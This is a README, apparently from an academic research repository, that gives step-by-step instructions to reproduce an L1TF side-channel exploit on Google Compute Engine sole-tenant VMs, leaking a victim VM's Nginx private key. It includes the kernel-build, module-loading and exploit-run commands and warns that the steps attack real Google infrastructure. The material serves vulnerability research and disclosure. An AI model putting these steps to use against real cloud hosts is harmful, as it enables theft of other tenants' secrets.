```
WARNING: The instruction below let you launch a cyber attack on the real-world cloud infrastructure of Google.
BEFORE YOU PROCEED: Ensure you are part of, or in agreement with, the Google security team handling this vulnerability.
Contact:
- m.c.hertogh at vu dot nl (VU Amsterdam, exploit author)
- aesa at google dot com (google security)
- evn at google dot com (google security)
```

# Setting up the VMs

Make sure you have a functioning Google Cloud account.

## Create Sole-Tenant Node
- In the Google Compute Engine overview webpage, go to "Sole-tenant nodes".
- Click "Create node group", and:
  - Pick some "region" and "zone";
  - Create (or pick) a node template with:
    - "Node type" = n1-node-96-624; (Note: if not listed; pick another region/zone)
    - Enable "CPU overcommit".
  - Keep "Autoscaling" = off;
  - Pick "Number of nodes" = 1;
  - Keep the default maintenance and share settings.

## Create Victim VM
- In the Google Compute Engine overview webpage, go to "Sole-tenant nodes".
- Pick (one of) your node group(s) based on a "n1-node-96-624" template.
- Click "create instance", and:
  - Set the "name", to e.g. `gce-victim`
  - Keep all other settings default, which means 2 vCPUs, 7.5 GB Memory, 10GB disk with Debian 12 Bookworm OS, etc.
  - "Create" the VM instance.
- Copy `setup/install_nginx_https.sh` script over to `gce-victim` and run it to install the Nginx webserver and configure it to HTTPS.
  The output should contain the private key of a newly generated, self-signed TSL certificate,
  and an example webpage containing "Welcome to nginx!".

## Create Attacker VM

Create the `gce-attacker` VM via the Google Cloud Console,
similar to the victim VM, except for making its disk bigger: 50GB.
(We need some space to compile the Linux kernel.)

Install standard packages, download the L1TF Reloaded repo, and install a custom kernel that speeds up L1TF on `gce-attacker`:
```
sudo apt install -y locales-all fakeroot git kernel-wedge quilt ccache flex bison libssl-dev dh-exec rsync libelf-dev bc libncurses-dev lz4 liblz4-dev tmux cmake libgmp3-dev python3-pycryptodome
git clone git@github.com:vusec/l1tf_reloaded.git
git clone git@github.com:torvalds/linux.git --branch v6.13 --depth 1
cd linux
git apply ../l1tf_reloaded/setup/l1tf-pf.patch
cp ../l1tf_reloaded/setup/kconfig .config
make -j2 bindeb-pkg
printf "\nGRUB_DISABLE_SUBMENU=y\n" | sudo tee /etc/default/grub
sudo dpkg -i ../linux-*.deb
```

Building the kernel takes almost 2 hours, so you might want to run it in the background in a tmux session.

Reboot the VM into the just installed `l1tf-pf` kernel (`sudo reboot`).
After reboot, ensure `uname -r` gives back `6.13.0-l1tf-pf+`.

## The Exploit

Go into the `l1tf_reloaded` directory. Load the required dependencies and install the needed kernel modules:
```
make load_modules
```

Ensure `include/config.h` holds the following configuration:
```
#define MACHINE GCE
#define HELPERS 0
#define LEAK L1TF
```

Build the exploit:
```
make exploit
```

Run the exploit:
```
make
```

This will take many hours, hence we recommend running this inside a tmux session or similar.
Output of `stdout` will go to the screen as well as the file `std.out`, and extra
verbose `stderr` output is saved in the file `std.err`.

If all goes well, you expect to see something similar to our demo, resulting in a leaked private key.
To check its correctness, compare it against the true key of the victim's Nginx webserver,
located at `gce-victim:/etc/ssl/private/nginx-selfsigned.key`.
